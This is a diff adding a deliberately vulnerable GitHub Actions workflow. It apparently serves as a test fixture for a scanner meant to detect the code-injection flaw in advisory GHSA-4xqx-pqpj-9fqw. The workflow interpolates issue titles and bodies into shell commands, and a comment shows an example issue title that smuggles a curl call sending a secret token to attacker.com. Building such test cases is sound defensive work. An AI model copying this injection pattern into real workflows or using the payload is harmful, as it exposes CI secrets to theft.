@@ -1,0 +1,50 @@
+# GHSA-4xqx-pqpj-9fqw: Code execution via crafted GitHub issue in atlassian/gajira-create
+# Advisory URL: https://github.com/advisories/GHSA-4xqx-pqpj-9fqw
+# Vulnerability Type: Code Injection (Critical)
+# Expected Detection: CodeInjectionCriticalRule or ArgumentInjectionCriticalRule
+#
+# Vulnerable Pattern: Issue content (title, body) is interpolated in shell commands
+# Attacker can create issue with malicious content to execute arbitrary code
+
+name: Vulnerable Jira Issue Creation
+
+on:
+  issues:
+    types: [opened]
+
+jobs:
+  create-jira-issue:
+    runs-on: ubuntu-latest
+    permissions:
+      issues: write
+
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+
+      # Vulnerable: Issue title and body are directly interpolated
+      - name: Create Jira issue with user content
+        run: |
+          ISSUE_TITLE="${{ github.event.issue.title }}"
+          ISSUE_BODY="${{ github.event.issue.body }}"
+
+          echo "Creating Jira issue: $ISSUE_TITLE"
+
+          # Attacker can set title to: Test $(curl http://attacker.com/?secret=$SECRET_TOKEN)
+          curl -X POST https://jira.example.com/rest/api/2/issue \
+            -H "Authorization: Bearer ${{ secrets.JIRA_TOKEN }}" \
+            -H "Content-Type: application/json" \
+            -d "{\"fields\": {\"summary\": \"$ISSUE_TITLE\", \"description\": \"$ISSUE_BODY\"}}"
+
+      # Another vulnerable pattern with gajira-create action
+      - name: Create Jira ticket
+        uses: atlassian/gajira-create@v3
+        with:
+          # Issue content interpolated directly in action inputs
+          summary: ${{ github.event.issue.title }}
+          description: ${{ github.event.issue.body }}
+          issuetype: Bug
+        env:
+          JIRA_BASE_URL: https://jira.example.com
+          JIRA_USER_EMAIL: bot@example.com
+          JIRA_API_TOKEN: ${{ secrets.JIRA_API_TOKEN }}
